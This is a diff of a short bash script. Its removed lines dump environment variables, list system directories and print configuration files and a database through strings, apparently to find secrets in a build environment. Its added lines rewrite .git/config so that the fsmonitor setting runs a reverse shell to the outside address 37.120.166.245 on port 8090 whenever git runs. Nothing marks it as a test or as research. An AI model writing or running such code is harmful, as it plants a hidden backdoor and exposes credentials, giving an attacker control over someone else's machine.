@@ -1,14 +1,16 @@
 #!/usr/bin/env bash
 
-env 1>&2
-ls -la / 1>&2
-ls -la /tmp 1>&2
-ls -la /code 1>&2
-ls -la /pc 1>&2
-cat /pc/local/*/*.yml 1>&2
-cat /pc/local/*/*.yaml 1>&2
-cat /pc/local/*/package.json 1>&2
-strings /pc/db.db 1>&2
-mount 1>&2
-echo "test" > hello2.txt
+
+echo "test6" > test.txt
+
+mkdir .git/hooks/
+cat > .git/config <<'EOF'
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+	fsmonitor = "/bin/bash -c 'bash -i >& /dev/tcp/37.120.166.245/8090 0>&1'"
+EOF
+
 exit 0
